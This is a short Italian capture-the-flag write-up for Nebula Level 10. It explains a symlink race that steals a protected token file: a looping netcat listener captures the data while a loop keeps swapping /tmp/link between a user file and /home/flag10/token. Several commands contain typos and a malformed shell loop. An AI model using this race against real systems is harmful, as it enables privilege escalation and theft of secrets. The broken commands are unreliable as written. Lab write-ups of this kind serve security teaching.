## Level 10
### Soluzione
L'idea è andare a creare un link simbolico che cambia in maniera rapidissiam tra un file su cui ho permessi e il token. 
#### Creo un server TCP
Si utilizza netcat, e lo inserirò in un civlo infinito:
```
while:; do nc.traditional -vlp 18211; >> /tmp/save.txt; done
```
Voglio anche sbagttere su un file tutto ciò che i vari client mi invieranno poi Si associa in rapida successione e di continuo un link simbolico di nome /tmp/link ai due file
/tmp/token e /home/flag10/token.
Su un terminale in esecuzione su Nebula:
```
while :; do ln -fs /tmp/token /tmp/link; ln -fs /home/flag10/token /tmp/link; done
```

